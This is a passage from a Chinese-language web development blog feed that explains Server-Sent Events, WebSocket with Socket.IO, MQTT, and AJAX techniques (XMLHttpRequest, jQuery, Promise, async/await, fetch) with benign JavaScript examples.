class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">modify</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: <span class="number">1</span> &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">sendEventsToClients</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">get</span>(<span class="string">&quot;/modify&quot;</span>, modify);</span><br><span class="line">server.<span class="title function_">get</span>(<span class="string">&quot;/listen&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; clientId &#125; = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">const</span> headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/event-stream&quot;</span>,</span><br><span class="line">    <span class="title class_">Connection</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">200</span>, headers);</span><br><span class="line">  res.<span class="title function_">write</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> newClient = &#123;</span><br><span class="line">    <span class="attr">id</span>: clientId,</span><br><span class="line">    res,</span><br><span class="line">  &#125;;</span><br><span class="line">  clients.<span class="title function_">push</span>(newClient);</span><br><span class="line">  req.<span class="title function_">on</span>(<span class="string">&quot;close&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    clients = clients.<span class="title function_">filter</span>(<span class="function">(<span class="params">c</span>) =&gt;</span> c.<span class="property">id</span> !== clientId);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// client</span></span><br><span class="line"><span class="keyword">const</span> events = <span class="keyword">new</span> <span class="title class_">EventSource</span>(<span class="string">&quot;/listen?clientId=test&quot;</span>);</span><br><span class="line">events.<span class="property">onmessage</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">data</span>) <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">events.<span class="title function_">addEventListener</span>(<span class="string">&quot;ping&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">data</span>) <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">data</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h2><p>WebSocket 這個 API 在不必 polling 伺服器的情況下，讓用戶傳送訊息至伺服器並接受事件驅動回應，達到即時通訊的效果。</p><p>接近真的談戀愛的溝通，雙方各自在沒什麼負擔的情況下進行訊息的交流。</p><h3 id="Socket-IO-簡介"><a href="#Socket-IO-簡介" class="headerlink" title="Socket.IO 簡介"></a>Socket.IO 簡介</h3><p><a href="https://socket.io/docs/">Socket.IO</a> 屬於 node.js 解決方案，封裝了 Long-Polling 及 WebSocket，是一個 event-based 全雙工的通訊函式庫，事件驅動這個部分是最容易出現效能的地方。</p><p>當和 react 專案整合時，需要注意事件是否影響畫面渲染，避免每渲染一次就重新建立連結、重新監聽事件、重新發出訊息，記憶體很快就會用完，處理器來不及處理。</p><p>後端的基本範例:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(app);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Server</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;socket.io&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> io = <span class="keyword">new</span> <span class="title class_">Server</span>(server);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">on</span>(<span class="string">&quot;connection&quot;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a user connected&quot;</span>);</span><br><span class="line">  socket.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;message: &quot;</span> + msg);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listening on *:3000&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>前端的基本範例:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="title function_">io</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;form&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;input&quot;</span>);</span><br><span class="line"></span><br><span class="line">form.<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">if</span> (input.<span class="property">value</span>) &#123;</span><br><span class="line">    socket.<span class="title function_">emit</span>(<span class="string">&quot;message&quot;</span>, input.<span class="property">value</span>);</span><br><span class="line">    input.<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="MQTT"><a href="#MQTT" class="headerlink" title="MQTT"></a>MQTT</h3><p>MQTT (Message Queuing Telemetry Transport) 適合輕量級物聯網使用，封包較小可以支援大量的 client。</p><p>主要是基於 subscribe 跟 publish 兩個概念的協定，為了硬體效能低下的遠端裝置以及網路狀況糟糕的情況下而設計。</p><p>主要是以 TCP&#x2F;IP 協定上去優化且取代 HTTP 這種較肥的資料傳輸協定，因此會需要一個訊息中介軟體 (MQTT Broker) 來提供輕量化的解決方案。</p><p>底下官方範例會是使用官方提供的 MQTT Broker <code>mqtt://test.mosquitto.org</code>，若為自己的服務需要自行架設。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>test Ws mqtt.js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/mqtt/dist/mqtt.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> mqtt = <span class="built_in">require</span>(<span class="string">&quot;mqtt&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> client = mqtt.<span class="title function_">connect</span>(<span class="string">&quot;mqtt://test.mosquitto.org&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      client.<span class="title function_">on</span>(<span class="string">&quot;connect&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        client.<span class="title function_">subscribe</span>(<span class="string">&quot;presence&quot;</span>, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">if</span> (!err) &#123;</span></span><br><span class="line"><span class="language-javascript">            client.<span class="title function_">publish</span>(<span class="string">&quot;presence&quot;</span>, <span class="string">&quot;Hello mqtt&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      client.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="keyword">function</span> (<span class="params">topic, message</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// message is Buffer</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(message.<span class="title function_">toString</span>());</span></span><br><span class="line"><span class="language-javascript">        client.<span class="title function_">end</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全攻略 AJAX 是什麼</title>
      <link href="/2022/09/22/relationships-between-frontend-and-backend/js-http-client-with-ajax/"/>
      <url>/2022/09/22/relationships-between-frontend-and-backend/js-http-client-with-ajax/</url>
      
        <content type="html"><![CDATA[<p>在前面幾篇文章，小編介紹了<a href="https://linyencheng.github.io/2022/09/15/relationships-between-frontend-and-backend/backend-restful-api/">什麼是 API</a>、<a href="https://linyencheng.github.io/2022/09/16/relationships-between-frontend-and-backend/backend-api-design/">API 系統設計方法</a>、<a href="https://linyencheng.github.io/2022/09/17/relationships-between-frontend-and-backend/backend-api-implement/">Web API 實作解析</a>，接下來就來介紹怎麼透過 AJAX 這個技術和後端的 Web API 溝通進行資料交換。</p><ol><li>確認 API 的介面</li><li>用戶端透過瀏覽器發出 AJAX 請求</li><li>伺服器依據請求的方法、內容與資料庫資源整合後進行回應</li></ol><p>以男女交往來說重要的溝通是</p><ul><li>丟球: 會不會丟球，不會丟球對方就不知道該怎麼和你進一步互動</li><li>接球: 對方丟球該怎麼接到，該怎麼看到球飛過來</li></ul><p>當後端的 Web API 開好後，前端也要能夠知道該怎麼對後端發出請求，也才能夠做到良好的互動。</p><h2 id="什麼是-AJAX"><a href="#什麼是-AJAX" class="headerlink" title="什麼是 AJAX?"></a>什麼是 AJAX?</h2><p>AJAX（Asynchronous JavaScript And XML)，直接用翻譯看就是非同步 JavaScript 與 XML，雖然是寫 XML 但也可以用現今廣泛使用的 JSON 來做資料交換。</p><p>因為 JavaScript 單線程一次只能做一件事，在發送請求到伺服器時會需要等待回覆，若這時伺服器一直沒回應，在單線程的情況下其他任務會被卡死，因此也才有了非同步請求，AJAX 可以讓網頁能夠只更新需要的部分，而無須重新載入整個頁面。</p><h3 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h3><p>W3C 標準的非同步請求是利用 XMLHttpRequest 寫法:</p><ul><li>優點: 簡單直觀所有相關操作都從這個物件去取得</li><li>缺點: 結構會不漂亮，所以後來 jQuery AJAX 以原生的標準為基礎，封裝後讓寫法更好</li></ul><p>XMLHttpRequest 是一個能夠取得伺服器端的資料的物件，取得資料的方式可以為非同步 (asynchronously) 或同步 (synchronously)。</p><p>發出 request，需叫用 HTTP request 類別的 open() 及 send() 兩個方法</p><ul><li>send(): 發出 request，若為 POST 可以帶入資料</li><li>open(): request 相關設定，有三個參數<ul><li>第一個參數為 HTTP request 的方法 (全大寫)<ul><li>GET: 請求資源</li><li>POST: 新增資源</li><li>PUT: 取代資源</li><li>PATCH: 更新資源</li><li>DELETE: 刪除資源</li></ul></li><li>第二個參數為 URL: 預設會擋 CORS</li><li>第三個參數為是否非同步，預設是非同步</li></ul></li></ul><p>發出 request 後，要檢查 request 目前的 readyState。</p><p>如果狀態值為 4 代表伺服器已經傳回所有資訊了，readyState 所有可能的值如下：</p><ul><li>0: 還沒開始</li><li>1: 讀取中</li><li>2: 已讀取</li><li>3: 資訊交換中</li><li>4: 完成</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&quot;readystatechange&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> === <span class="title class_">XMLHttpRequest</span>.<span class="property">DONE</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (httpRequest.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="comment">// 萬事具備</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>(</span><br><span class="line">  <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span></span><br><span class="line">);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;cache-control&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">send</span>(data);</span><br></pre></td></tr></table></figure><h4 id="jQuery-AJAX"><a href="#jQuery-AJAX" class="headerlink" title="jQuery AJAX"></a>jQuery AJAX</h4><p>jQuery 的 Ajax 則以原生的標準為基礎，封裝後讓寫法更好，大幅簡化程式且提供多種方法</p><ul><li>$.get(url,data,callback): get 傳送 data 到 url，並透過 callback 取得執行指令與 url 結果</li><li>$.post(url,data,callback) 同上，但以 post 傳送 data 到 url</li><li>$.ajax(setting) 完整的 Ajax 控制語法，setting 為多資料之物件結構陣列</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">  <span class="attr">async</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">crossDomain</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span>,</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$.<span class="title function_">ajax</span>(settings).<span class="title function_">done</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h3><p>Promise 是承諾的意思，可以想成不管是否完成都會告知結果。</p><blockquote><p>代表瀏覽器說著：「我承諾我會盡快給予你一個答覆」</p></blockquote><p>Promise 是在 JavaScript 中非同步程式碼的一種新風格樣式，目前已經實作在各大主流瀏覽器中，定義可以看<a href="https://promisesaplus.com/">這個網頁</a>。</p><p>Promise 建立之後，要不成功要不失敗，一個好例子是 fetch API，它基本上就是新一代的 XMLHttpRequest，另外 Async&#x2F;Await 是 Promise 下一代的解決方案，把 then 取代成 Async&#x2F;Await 後，就能按照同步的語法撰寫。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">asyncFunction</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span> (<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (value) <span class="title function_">resolve</span>(value);</span><br><span class="line">    <span class="comment">// 已實現，成功</span></span><br><span class="line">    <span class="keyword">else</span> <span class="title function_">reject</span>(reason); <span class="comment">// 有錯誤，已拒絕，失敗</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要使用 then 及丟進去的 callback 去取值出來，這裡的 callback 就都是非同步執行的喔!!!</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">asyncFunction</span>(<span class="string">&quot;test&quot;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">datums</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(datums);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>promise.all</code>，適合用在多支 API 要一起執行，並確保全部完成後才進行其他工作時。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="title function_">promise</span>(<span class="number">1</span>), <span class="title function_">promise</span>(<span class="number">2</span>), <span class="title function_">promise</span>(<span class="number">3</span>, <span class="number">5000</span>)]).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>promise.race</code>，適合用在站點不穩定，同時發送多支同行為 API 確保可行性使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">race</span>([<span class="title function_">promise</span>(<span class="number">1</span>), <span class="title function_">promise</span>(<span class="number">2</span>), <span class="title function_">promise</span>(<span class="number">3</span>, <span class="number">5000</span>)]).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>promise.allSettled</code> 適合有多個不相互依賴的異步任務才能成功完成 (想知道每個承諾的結果)，在所有都已完成或拒絕後完成的 Promise。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise1 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(reject, <span class="number">100</span>, <span class="string">&quot;fail&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">const</span> promises = [promise1, promise2];</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">allSettled</span>(promises).<span class="title function_">then</span>(<span class="function">(<span class="params">results</span>) =&gt;</span></span><br><span class="line">  results.<span class="title function_">forEach</span>(<span class="function">(<span class="params">result</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">status</span>))</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="async-await"><a href="#async-await" class="headerlink" title="async await"></a>async await</h4><p>Promise 在設置上可能會有些複雜並難以理解，因此現代瀏覽器實作出 async 以及 await。</p><ul><li>async 能夠讓函式執行非同步行為</li><li>await 可以被用在 async 函式內部，讓程式碼繼續執行前去等待一個 Promise 完成</li></ul><p>這能讓程式碼在一連串的 Promise 的情況時更加簡潔易懂，只要加上 await 就可以直接叫用一個返回 Promise 的函數，程式碼就會直接在那裏等待，直到 Promise 被完成。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchProducts</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(</span><br><span class="line">      <span class="string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`HTTP：<span class="subst">$&#123;response.status&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> json = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(json[<span class="number">0</span>].<span class="property">name</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`<span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jsonPromise = <span class="title function_">fetchProducts</span>();</span><br><span class="line">jsonPromise.<span class="title function_">then</span>(<span class="function">(<span class="params">json</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(json[<span class="number">0</span>].<span class="property">name</span>));</span><br></pre></td></tr></table></figure><p>從 Promise 改成 async&#x2F;await 優化了什麼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">promiseFn</span>(<span class="number">1</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// 1, 成功</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">promiseFn</span>(<span class="number">2</span>); <span class="comment">// 鏈接第二次的 Promise 方法</span></span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// 2, 成功</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">await</span> <span class="title function_">promiseFn</span>(<span class="number">1</span>); <span class="comment">// 因為 await，promise 函式被中止直到回傳</span></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">await</span> <span class="title function_">promiseFn</span>(<span class="number">2</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data1, data2); <span class="comment">// 1, 成功 2, 成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Fetch"><a href="#Fetch" class="headerlink" title="Fetch"></a>Fetch</h4><p>在這裡我們看到 fetch() 帶一個 URL 參數並回傳一個 promise，可以看成是 AJAX 的新版本，詳情可看<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">MDN 的簡介</a>。</p><p>看寫法的話就知道是已經基於 promise 來設計的，其中要注意的是預設 fetch 不會收或送 cookie 必須設定 <code>credentials</code> 這個參數才可以。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;http://localhost:8080/api/v1/book/1&quot;</span>, &#123; <span class="attr">method</span>: <span class="string">&quot;get&quot;</span> &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="comment">//處理 response</span></span><br><span class="line">    <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">json</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> products = json;</span><br><span class="line">    <span class="title function_">initialize</span>(products);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="keyword">function</span> 